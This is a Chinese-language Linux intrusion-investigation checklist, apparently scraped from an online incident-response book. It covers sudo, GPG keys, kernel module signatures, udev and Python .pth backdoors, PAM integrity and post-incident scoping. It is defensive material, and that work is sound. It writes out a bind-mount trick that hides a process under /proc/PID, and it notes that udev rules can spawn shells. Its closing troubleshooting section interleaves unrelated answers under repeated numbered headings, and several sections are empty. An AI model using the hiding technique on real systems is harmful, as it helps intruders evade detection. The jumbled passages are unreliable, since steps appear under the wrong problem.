### 0x26 软件及其配置文件完整性检查

参考 小技巧 -> 系统完整性检查 章节

### 0x27 sudo 配置检查

需要注意文件权限和文件内容

 - /etc/sudo.conf
 - /etc/sudoers
 - /etc/sudoers.d/

 【Ubuntu Server 22.04】 默认情况

`/etc/sudo.conf`

`/etc/sudoers`

`/etc/sudoers.d/`

【Rocky Linux 9.1】 默认情况

`/etc/sudo.conf`

`/etc/sudoers`

`/etc/sudoers.d/`

### 0x28 第三方软件源 GPG 密钥检查

`Ubuntu Linux
sudo apt-key list
具体存储目录为 /etc/apt/trusted.gpg.d/

Centos/Rocky Linux
gpg --quiet --show-keys /etc/pki/rpm-gpg/*
具体存储目录为 /etc/pki/rpm-gpg/

```
 【Ubuntu Server 22.04】 默认情况

 `8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092
F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C

```
 【Rocky Linux 9.1】 默认情况

 `B08B659EE86AF623BC90E8DB938A80CAF21541EB
567E347AD0044ADE55BA8A5F199E2F91FD431D51
21CB256AE16FC54C6E652949702D426D350D275D
0675BD19F4FFE3AD0B2D6FEBADA2860895AE3D91

```
 Centos 可能会有不同，需要拿具体服务器做对比

### 0x29 计划任务日志

计划任务是攻击者常用的权限维持手段，因此这里将其日志单独拿出来作为一个检查项，关于默认的计划任务，详情查看计划任务章节

 `journalctl -u crond

```

### 0x30 内核模块签名配置检查

查看系统是否配置了加载进入到内核的模块都需要有效签名

 `zgrep CONFIG_MODULE_SIG /boot/config-$(uname -r) | grep -v "^#"

```

 - `CONFIG_MODULE_SIG_FORMAT`：是否启用模块签名格式选项
 - `CONFIG_MODULE_SIG`: 如果设为 `y`，则启用模块签名功能，默认情况下，在加载没有签名或签名不正确的内核模块时，仅打印一条提示信息，然后继续加载该模块
 - `CONFIG_MODULE_SIG_ALL`：是否强制所有模块都必须签名，内核在编译时会尝试对所有内核模块进行签名
 - `CONFIG_MODULE_SIG_FORCE`: 如果设为 `y`，则强制所有模块必须有有效的签名才能加载。
 - `CONFIG_MODULE_SIG_KEY`: 指定用于签名的私钥文件。
 - `CONFIG_MODULE_SIG_HASH`: 指定用于签名的哈希算法（如 `sha256`）。

 【 Ubuntu Server 22.04 】 默认情况

 `CONFIG_MODULE_SIG_FORMAT=y
CONFIG_MODULE_SIG=y
CONFIG_MODULE_SIG_ALL=y
CONFIG_MODULE_SIG_SHA512=y
CONFIG_MODULE_SIG_HASH="sha512"
CONFIG_MODULE_SIG_KEY="certs/signing_key.pem"
CONFIG_MODULE_SIG_KEY_TYPE_RSA=y

```
 【 Rocky Linux 9.1 】

 `CONFIG_MODULE_SIG_FORMAT=y
CONFIG_MODULE_SIG=y
CONFIG_MODULE_SIG_ALL=y
CONFIG_MODULE_SIG_SHA512=y
CONFIG_MODULE_SIG_HASH="sha512"
CONFIG_MODULE_SIG_KEY="certs/signing_key.pem"

```

### 0x31 签名不合法的内核模块

查看内核加载的模块

 `lsmod

```

查看内核模块的信息

 `modinfo <module_name>

```

可以看到内核模块的一些信息，包括文件位置、是否签名、签名信息等

是否加载了非有效签名的模块

这部分内容本来是想将所有加载的内核模块的签名都校验一遍，但是查询了大量资料后，并没有找到如何从系统中找到内核模块签名校验对应的公钥文件，所以只能通过日志等方式进行辅助校验

 `sudo dmesg | grep -i "taint"

```
 在部分配置情况下，未进行有效签名的内核模块也会被加载，但是会在日志中留下类似下面的记录

 `module verification failed: signature and/or required key missing - tainting kernel

```
 也可以通过相关日志文件进行查看

 - `/var/log/kern.log`
 - `/var/log/syslog`

 可以通过下面的脚本方便地进行检索

 `#!/bin/bash

# 搜索内核环缓冲区
echo "Checking dmesg for module loading issues..."
sudo dmesg | grep -i "taint"

# 搜索系统日志文件
echo "Checking /var/log/syslog for module loading issues..."
sudo grep -i "taint" /var/log/syslog

echo "Checking /var/log/kern.log for module loading issues..."
sudo grep -i -E "taint" /var/log/kern.log

```

### 0x32 PAM 检查

### 0x33 proc与ps进程对比

如果存在 /proc 目录中有进程文件夹，但是在 `ps -aux` 命令里没有显示的，就认为可能是异常进程

检测脚本

 `import subprocess
import os

def get_ps_aux():
    # 获取 `ps -aux` 的输出
    result = subprocess.run(['ps', '-aux'], stdout=subprocess.PIPE, text=True)
    ps_output = result.stdout.strip().split('\n')
    ps_pids = set()

    # 提取每行的PID
    for line in ps_output[1:]:  # 跳过标题行
        parts = line.split()
        if len(parts) > 1:
            ps_pids.add(parts[1])

    return ps_pids

def get_proc_pids():
    # 读取 /proc 目录中的进程ID
    proc_pids = set()
    for entry in os.listdir('/proc'):
        if entry.isdigit():
            proc_pids.add(entry)

    return proc_pids

def compare_ps_proc():
    ps_pids = get_ps_aux()
    proc_pids = get_proc_pids()

    # 找出 /proc 中有但 ps -aux 中没有的进程
    proc_not_in_ps = proc_pids - ps_pids

    return proc_not_in_ps

if __name__ == "__main__":
    proc_not_in_ps = compare_ps_proc()

    if proc_not_in_ps:
        print("在 /proc 中存在但 ps -aux 中不存在的进程:", proc_not_in_ps)
    else:
        print("未发现异常进程")

```

### 0x34 Trap 检查

trap 后门主要集中在与登录配置文件结合，登录配置文件检查在上面已经包含了，所以只需要检查当前 shell 环境的 trap 情况

 `trap -p

```

### 0x35 家目录模板检查

系统在新建用户需要创建家目录时，会从模板处复制一份给新用户，如果攻击者在此处投毒，新创建用户可能都会受影响

新建用户的家目录模板为 `/etc/skel/`

【 Ubuntu Server 22.04 】默认情况

`/etc/skel/.bash_logout`

 `# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi

```
 `/etc/skel/.profile`

 `# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
    . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/.local/bin" ] ; then
    PATH="$HOME/.local/bin:$PATH"
fi

```
 `/etc/skel/.bashrc`

 `# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
    # We have color support; assume it's compliant with Ecma-48
    # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
    # a case would tend to support setf rather than setaf.)
    color_prompt=yes
    else
    color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

```
 【 Rocky Linux 9 】默认情况

`/etc/skel/.bash_logout`

 `# ~/.bash_logout

```
 `/etc/skel/.bash_profile`

 `# .bash_profile

# Get the aliases and functions
if [ -f ~/.bashrc ]; then
    . ~/.bashrc
fi

# User specific environment and startup programs

```
 `/etc/skel/.bashrc`

 `# .bashrc

# Source global definitions
if [ -f /etc/bashrc ]; then
    . /etc/bashrc
fi

# User specific environment
if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]
then
    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
fi
export PATH

# Uncomment the following line if you don't like systemctl's auto-paging feature:
# export SYSTEMD_PAGER=

# User specific aliases and functions
if [ -d ~/.bashrc.d ]; then
    for rc in ~/.bashrc.d/*; do
        if [ -f "$rc" ]; then
            . "$rc"
        fi
    done
fi

unset rc

```

### 0x36 TCP Wrappers 排查

TCP Wrappers 是一种用于控制对网络服务访问的安全工具。它可以限制和记录通过 `inetd` 超级服务器启动的服务的访问。主要功能包括：

 - 访问控制：根据主机名、IP 地址或域名限制对服务的访问。
 - 日志记录：记录所有访问尝试，包括成功和失败的连接。

 该工具有两个配置文件，分别控制允许和拒绝，文件地址如下:

 - /etc/hosts.allow
 - /etc/hosts.deny

 文件内容语法如下：

 `<服务>: <客户端列表> [: <选项>]

```
 第一列为服务名称，第二列为客户端列表，关键在于第三列，第三列中包含两个动作可以执行系统命令

 - `spawn`：在匹配时执行命令。
 - `twist`：替代服务执行某个命令。

 例如

 `sshd: 192.168.1.1 : spawn (/bin/echo "Access from %h" >> /var/log/connections.log)

```
 因此需要排查 `/etc/hosts.allow` 和 `/etc/hosts.deny` 文件内容是否存在 `spawn` 、`twist` 以及不合理的配置

【 Ubuntu Server 22.04 】默认情况

【 Rocky Linux 9 】默认情况

默认不安装 TCP Wrappers

### 0x37 敏感目录排查

攻击者常利用的一些目录排查，例如 `/tmp/`

 目录地址 目录含义 /tmp/ 临时文件目录，所有用户都可以在这里创建文件 /dev/shm 基于内存的临时文件系统，类似于tmpfs，速度很快，但重启后数据会消失 /var/tmp 通常用于存放系统或应用在重启之间需要保留的临时文件 ~/.xxxxxx 各个用户家目录隐藏文件夹 常见Web 目录(例如 /var/www/html) 用于存放 Web 相关脚本等 环境变量 $PATH 中包含的目录 `$PATH` 环境变量中定义的目录是系统或用户自定义的可执行程序搜索路径 如果想查看目录本身的信息，可以使用 `ls -ald` 命令

### 0x38 udev 后门排查

udev 是Linux kernel的设备管理器，主要管理`/dev`目录底下的设备节点。它同时也是用来接替 devfs 及 hotplug 的功能，这意味着它要在添加/删除硬件时处理`/dev`目录以及所有用户空间的行为，包括加载固件时。

除了 udev 程序本身以及其加载的共享库替换后门以外，udev 的规则文件经常被用来做后门，规则文件位于以下三个位置

 目录路径 用途说明 优先级顺序 `/etc/udev/rules.d/` 用户自定义规则：由系统管理员手动添加或修改，用于覆盖或扩展默认规则。 高 `/run/udev/rules.d/` 临时规则：由系统或程序在运行时动态生成，重启后失效。 中 `/lib/udev/rules.d/` 系统默认规则：由发行版或软件包（如内核、驱动）提供，不可手动修改。 低 我们需要着重关注每个规则文件中以下三个关键字(赋值键)

 - RUN
 - PROGRAM
 - IMPORT

 以上三个键都是可以直接引用外部程序的，例如创建文件、写入文件、执行文件、反弹shell

 `sudo grep -riI 'RUN\|PROGRAM\|IMPORT' /etc/udev/rules.d/ /usr/lib/udev/rules.d/ /run/udev/rules.d/

```

输出量非常大，最好是配合文件的时间属性以及相同系统版本对照着看，也可以进一步筛选

更多关于 udev 持久化内容可以查看我们公众号的分析文章

https://mp.weixin.qq.com/s/t9pOy5MzZ6hxH0gdgprI7g

### 0x39 Python .pth 后门排查

参考

https://dfir.ch/posts/publish_python_pth_extension/

https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/

`.pth` 后缀的文件用于扩展模块搜索路径。当此类文件位于`site-packages`或`dist-packages`等目录时，Python会在启动时自动处理文件内容

但是它有一个问题，如果文件以 import 开头，那么在执行任意 Python 代码时就会执行 `*.pth` 文件的代码

排查 `*.pth` 后门的思路就是找到所有的 `site-packages` 和 `dist-packages` 目录，之后查看其中的 `*.pth` 是否存在以 import 开头的行

还有就是关注 `PYTHONPATH` 环境变量是否被攻击者注入恶意模块路径

 `echo $PYTHONPATH

```
 至于 `*.pth` 文件检查，我建议使用 locate 找到所有的 `*.pth` 文件，之后看看其中是否存在 import 开头的恶意代码

【Ubuntu Server 22.04】默认情况

【Rocky Linux 9.1】 默认情况

### 针对新增模块与配置文件的排查

直接和默认存在的配置文件进行对比即可

【 Ubuntu Server 22.04 】

模块 `/usr/lib/x86_64-linux-gnu/security/`

 `-rw-r--r--  1 root root  18424 Feb  2  2023 pam_access.so
-rw-r--r--  1 root root  14328 Jun  7  2023 pam_cap.so
-rw-r--r--  1 root root  14408 Feb  2  2023 pam_debug.so
-rw-r--r--  1 root root  13960 Feb  2  2023 pam_deny.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_echo.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_env.so
-rw-r--r--  1 root root  22600 Feb  2  2023 pam_exec.so
-rw-r--r--  1 root root  63568 Feb  2  2023 pam_extrausers.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_faildelay.so
-rw-r--r--  1 root root  22520 Feb  2  2023 pam_faillock.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_filter.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_ftp.so
-rw-r--r--  1 root root  18504 Feb  2  2023 pam_group.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_issue.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_keyinit.so
-rw-r--r--  1 root root  18448 Feb  2  2023 pam_lastlog.so
-rw-r--r--  1 root root  26696 Feb  2  2023 pam_limits.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_listfile.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_localuser.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_loginuid.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_mail.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_mkhomedir.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_motd.so
-rw-r--r--  1 root root  43112 Feb  2  2023 pam_namespace.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_nologin.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_permit.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_pwhistory.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_rhosts.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_rootok.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_securetty.so
-rw-r--r--  1 root root  26616 Feb  2  2023 pam_selinux.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_sepermit.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_setquota.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_shells.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_stress.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_succeed_if.so
-rw-r--r--  1 root root 472008 Mar 20  2023 pam_systemd.so
-rw-r--r--  1 root root  18504 Feb  2  2023 pam_time.so
-rw-r--r--  1 root root  22608 Feb  2  2023 pam_timestamp.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_tty_audit.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_umask.so
-rw-r--r--  1 root root  59464 Feb  2  2023 pam_unix.so
-rw-r--r--  1 root root  18424 Feb  2  2023 pam_userdb.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_usertype.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_warn.so
-rw-r--r--  1 root root  14328 Feb  2  2023 pam_wheel.so
-rw-r--r--  1 root root  26616 Feb  2  2023 pam_xauth.so

```
 PAM 配置文件 `/etc/pam.d/`

 `-rw-r--r--  1 root root  384 Nov 11  2021 chfn
-rw-r--r--  1 root root   92 Nov 11  2021 chpasswd
-rw-r--r--  1 root root  581 Nov 11  2021 chsh
-rw-r--r--  1 root root 1208 Aug 10  2023 common-account
-rw-r--r--  1 root root 1242 Aug 10  2023 common-auth
-rw-r--r--  1 root root 1620 Aug 10  2023 common-password
-rw-r--r--  1 root root 1427 Aug 10  2023 common-session
-rw-r--r--  1 root root 1435 Aug 10  2023 common-session-noninteractive
-rw-r--r--  1 root root  606 Mar 17  2021 cron
-rw-r--r--  1 root root 4126 Mar 14  2022 login
-rw-r--r--  1 root root   92 Nov 11  2021 newusers
-rw-r--r--  1 root root  520 Aug 12  2020 other
-rw-r--r--  1 root root   92 Nov 11  2021 passwd
-rw-r--r--  1 root root  270 Feb 26  2022 polkit-1
-rw-r--r--  1 root root  143 Feb 20  2022 runuser
-rw-r--r--  1 root root  138 Feb 20  2022 runuser-l
-rw-r--r--  1 root root 2133 Jul 19  2023 sshd
-rw-r--r--  1 root root 2259 Feb 20  2022 su
-rw-r--r--  1 root root  330 Aug  3  2022 sudo
-rw-r--r--  1 root root  315 Aug  3  2022 sudo-i
-rw-r--r--  1 root root  137 Feb 20  2022 su-l

```
 【 Rocky Linux  9 】

模块 `/usr/lib64/security/`

 `-rwxr-xr-x.  1 root root  19448 Apr 13  2023 pam_access.so
-rwxr-xr-x.  1 root root  15776 May 26  2022 pam_cap.so
-rwxr-xr-x.  1 root root  15176 Apr 13  2023 pam_chroot.so
-rwxr-xr-x.  1 root root  31984 Apr 13  2023 pam_console.so
-rwxr-xr-x.  1 root root  15240 Apr 13  2023 pam_debug.so
-rwxr-xr-x.  1 root root  14928 Apr 13  2023 pam_deny.so
-rwxr-xr-x.  1 root root  15264 Apr 13  2023 pam_echo.so
-rwxr-xr-x.  1 root root  19464 Apr 13  2023 pam_env.so
-rwxr-xr-x.  1 root root  23424 Apr 13  2023 pam_exec.so
-rwxr-xr-x.  1 root root  15184 Apr 13  2023 pam_faildelay.so
-rwxr-xr-x.  1 root root  23520 Apr 13  2023 pam_faillock.so
drwxr-xr-x.  2 root root     24 Aug 11  2023 pam_filter
-rwxr-xr-x.  1 root root  19360 Apr 13  2023 pam_filter.so
-rwxr-xr-x.  1 root root  15184 Apr 13  2023 pam_ftp.so
-rwxr-xr-x.  1 root root  19344 Apr 13  2023 pam_group.so
-rwxr-xr-x.  1 root root  15224 Apr 13  2023 pam_issue.so
-rwxr-xr-x.  1 root root  15352 Apr 13  2023 pam_keyinit.so
-rwxr-xr-x.  1 root root  19512 Apr 13  2023 pam_lastlog.so
-rwxr-xr-x.  1 root root  27536 Apr 13  2023 pam_limits.so
-rwxr-xr-x.  1 root root  15232 Apr 13  2023 pam_listfile.so
-rwxr-xr-x.  1 root root  15224 Apr 13  2023 pam_localuser.so
-rwxr-xr-x.  1 root root  15240 Apr 13  2023 pam_loginuid.so
-rwxr-xr-x.  1 root root  19312 Apr 13  2023 pam_mail.so
-rwxr-xr-x.  1 root root  15184 Apr 13  2023 pam_mkhomedir.so
-rwxr-xr-x.  1 root root  15264 Apr 13  2023 pam_motd.so
-rwxr-xr-x.  1 root root  44152 Apr 13  2023 pam_namespace.so
-rwxr-xr-x.  1 root root  15232 Apr 13  2023 pam_nologin.so
-rwxr-xr-x.  1 root root  15208 Apr 13  2023 pam_permit.so
-rwxr-xr-x.  1 root root  15176 Apr 13  2023 pam_postgresok.so
-rwxr-xr-x.  1 root root  27512 Apr 13  2023 pam_pwhistory.so
-rwxr-xr-x.  1 root root  15848 May 26  2022 pam_pwquality.so
-rwxr-xr-x.  1 root root  15184 Apr 13  2023 pam_rhosts.so
-rwxr-xr-x.  1 root root  15248 Apr 13  2023 pam_rootok.so
-rwxr-xr-x.  1 root root  15240 Apr 13  2023 pam_securetty.so
-rwxr-xr-x.  1 root root  27616 Apr 13  2023 pam_selinux.so
lrwxrwxrwx.  1 root root     15 Apr 13  2023 pam_selinux_permit.so -> pam_sepermit.so
-rwxr-xr-x.  1 root root  19368 Apr 13  2023 pam_sepermit.so
-rwxr-xr-x.  1 root root  19312 Apr 13  2023 pam_setquota.so
-rwxr-xr-x.  1 root root  15216 Apr 13  2023 pam_shells.so
-rwxr-xr-x.  1 root root  65200 Apr 19  2023 pam_sss.so
-rwxr-xr-x.  1 root root  36264 Apr 19  2023 pam_sss_gss.so
-rwxr-xr-x.  1 root root  19416 Apr 13  2023 pam_stress.so
-rwxr-xr-x.  1 root root  19400 Apr 13  2023 pam_succeed_if.so
-rwxr-xr-x.  1 root root 514288 May  9  2023 pam_systemd.so
-rwxr-xr-x.  1 root root  19344 Apr 13  2023 pam_time.so
-rwxr-xr-x.  1 root root  27584 Apr 13  2023 pam_timestamp.so
-rwxr-xr-x.  1 root root  15232 Apr 13  2023 pam_tty_audit.so
-rwxr-xr-x.  1 root root  15184 Apr 13  2023 pam_umask.so
-rwxr-xr-x.  1 root root  56712 Apr 13  2023 pam_unix.so
lrwxrwxrwx.  1 root root     11 Apr 13  2023 pam_unix_acct.so -> pam_unix.so
lrwxrwxrwx.  1 root root     11 Apr 13  2023 pam_unix_auth.so -> pam_unix.so
lrwxrwxrwx.  1 root root     11 Apr 13  2023 pam_unix_passwd.so -> pam_unix.so
lrwxrwxrwx.  1 root root     11 Apr 13  2023 pam_unix_session.so -> pam_unix.so
-rwxr-xr-x.  1 root root  19360 Apr 13  2023 pam_userdb.so
-rwxr-xr-x.  1 root root  15264 Apr 13  2023 pam_usertype.so
-rwxr-xr-x.  1 root root  15232 Apr 13  2023 pam_warn.so
-rwxr-xr-x.  1 root root  15232 Apr 13  2023 pam_wheel.so
-rwxr-xr-x.  1 root root  27520 Apr 13  2023 pam_xauth.so

```
 配置文件 `/etc/pam.d/`

 `-rw-r--r--.  1 root root  232 Apr 13  2023 config-util
-rw-r--r--.  1 root root  322 Feb 15  2019 crond
-rw-r--r--.  1 root root  701 Apr 13  2023 fingerprint-auth
-rw-r--r--.  1 root root  676 May 10  2023 login
-rw-r--r--.  1 root root  154 Apr 13  2023 other
-rw-r--r--.  1 root root  168 May 15  2022 passwd
-rw-r--r--.  1 root root  760 Apr 13  2023 password-auth
-rw-r--r--.  1 root root  398 Apr 13  2023 postlogin
-rw-r--r--.  1 root root  640 May 10  2023 remote
-rw-r--r--.  1 root root  143 May 10  2023 runuser
-rw-r--r--.  1 root root  138 May 10  2023 runuser-l
-rw-r--r--.  1 root root  743 Apr 13  2023 smartcard-auth
-rw-r--r--.  1 root root  727 May 10  2023 sshd
-rw-r--r--.  1 root root  214 Dec  9  2022 sssd-shadowutils
-rw-r--r--.  1 root root  566 May 10  2023 su
-rw-r--r--.  1 root root  137 May 10  2023 su-l
-rw-r--r--.  1 root root  154 Apr 24  2023 sudo
-rw-r--r--.  1 root root  178 Apr 24  2023 sudo-i
-rw-r--r--.  1 root root  760 Apr 13  2023 system-auth
-rw-r--r--.  1 root root  295 May  9  2023 systemd-user
-rw-r--r--.  1 root root   84 May 16  2022 vlock

```

### 针对直接修改 PAM 库的后门检查

`debsums libpam0g -a -c

```

### 针对修改 PAM 模块的后门检查

直接对 `libpam0g` 检查不能发现 PAM 模块的篡改攻击，需要对整个系统进行完整性检查

 `debsums -a -c 2>/dev/null

```

### 针对修改 PAM 配置文件的后门检查

与修改 PAM 模块的后门检查方法一样

 `debsums -a -c 2>/dev/null

```

对于被修改的配置文件，需要详细检查其验证逻辑，同时与运维、开发人员确认是否为正常配置

此方法对于模块依赖的独立配置文件被修改情况同样有效

具体可参照我们公众号的文章

https://mp.weixin.qq.com/s/W4RX5WRzUp-hK1_Pr3rp7w

## 14. 善后阶段

> 原文：https://books.noptrace.com/linux/13.%E5%96%84%E5%90%8E%E9%98%B6%E6%AE%B5/

### 0x01 定损

定损过程就是确定受害范围的过程，此过程主要是与网络安全负责人、系统管理员、应用管理员、网络管理员等进行沟通交流

 - 统计出与受害系统使用了相同密码的服务器

 - 统计出与受害系统部署了相同存在漏洞或特有服务的服务器

 - 例如负载均衡下的服务器

 - 统计出与受害系统同一管理人员管理下的服务器

 - 主要是系统管理员和应用管理员

 - 统计出受害系统可以使用 ssh 密钥直接登录的服务器

 - 统计出受害系统受害期间频繁交互的服务器

 - ...

### 0x02 针对性排查处理

- 如果服务器数量不多，可以按照常规安全检查章节对服务器进行安全检查
 - 若服务器数量较多，可以通过安全设备查看是否存在来自这些服务器发起的攻击
 - 对内发起攻击
 - 对外发起攻击
 - 修改这些服务器的密码，尽量保证每一台服务器密码均不同，且为强口令

## 15. 常见问题的解决方法

> 原文：https://books.noptrace.com/linux/14.%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/

### 0x01 文件无法删除

以 `evil.sh`文件 为例，下列提到的方法都是在常规 rwx 权限满足条件后依旧无法删除文件的情况

### 0x02 netstat -pantu pid处显示 -

### 0x03 ps、top 等工具无法看到恶意进程

### 0x04 终端出现乱码

这里分为两种情况

 - ssh 连接或者物理本地连接就是乱码
 - 打开二进制文件等出现乱码，原本是正常显示的

 对于第一种情况，大概是语言显示问题，可以考虑更改语言显示，这个要让客户现场工作人员进行调整，属于是危险行为，所以这里也不给出具体的命令

第二种情况就比较常见了，在排查过程中很可能因为误读二进制文件导致终端乱码，可能出现提示符乱码、输入内容乱码、输入内容不可见等

如果再次获取一个终端环境，例如 ssh 或者本地打开终端非常方便，那就重新打开即可，如果再去获取终端环境较为困难，可以尝试以下方法

注意，即使输出不可见或乱码也不要担心，正常输入即可

### 1. 文件被进程占用

`lsof evil.sh

```

### 1. reset

`reset

```
 `reset` 命令可以重置终端的设置，这意味着当前终端之前执行的命令会丢失，即通过上/下按键能够快速获取的命令

### 1. 存在隐藏挂载

有些时候 netstat -pantu 显示 pid 处显示为 -

可能是使用了下面的方法隐藏

 - mkdir .hidden
 - mount -o bind .hidden /proc/PID

 这种情况可以使用 `cat /proc/$$/mountinfo` 来查看挂载信息

通过 `umount /proc/PID` 来取消挂载就好了

### 1. 通过挂载进行了隐藏

有些时候 ps、top 无法发现恶意进程

可能是使用了下面的方法隐藏

 - mkdir .hidden
 - mount -o bind .hidden /proc/PID

 这种情况可以使用 `cat /proc/$$/mountinfo` 来查看挂载信息

通过 `umount /proc/PID` 来取消挂载就好了

### 2. 文件存在隐藏属性

`lsattr evil.sh

```
 一般导致无法删除的隐藏属性有两种 `a` 和 `i`

可以像图中一样使用下列命令进行取消

 `chattr -a evil.sh
chattr -i evil.sh

```

### 2. ps、top 命令被替换

检查系统完整性 (参考 小技巧章节 -> 0x04 系统完整性检查)

将携带的 busybox 程序拷贝至受害系统中进行相关查询

### 2. stty sane

`stty sane

```
 `stty sane` 命令可以将终端设置恢复到常规模式

执行 `reset` 和 `stty sane` 命令通常不会影响 Bash 的配置文件（如 `.bashrc`、`.bash_profile` 等），这些命令主要作用于当前终端会话的显示和输入输出设置。具体来说：

`reset` 命令

 - 不会影响 Bash 配置文件：`reset` 命令不会修改或删除任何配置文件。它只是重置当前终端的状态，包括清除屏幕、重置颜色和光标位置等。
 - 重置终端状态：它会重置终端的显示模式和其他设置，但不会影响到 Bash 的配置。
 - 命令历史记录：虽然 `reset` 命令可能会清除当前屏幕上的命令历史显示，但不会影响 Bash 内部维护的命令历史记录文件（如 `.bash_history`）。

 `stty sane` 命令

 - 不会影响 Bash 配置文件：`stty sane` 命令也不会修改或删除任何配置文件。它只是将终端的各种设置恢复到默认的“正常”模式。
 - 恢复终端设置：它主要恢复终端的输入输出设置，如启用回显、启用特殊字符处理等，但不会影响到 Bash 的配置。

### 2. 权限不够

部分场景下，权限不够时也会显示 `-`

### 3. 进程刚刚释放

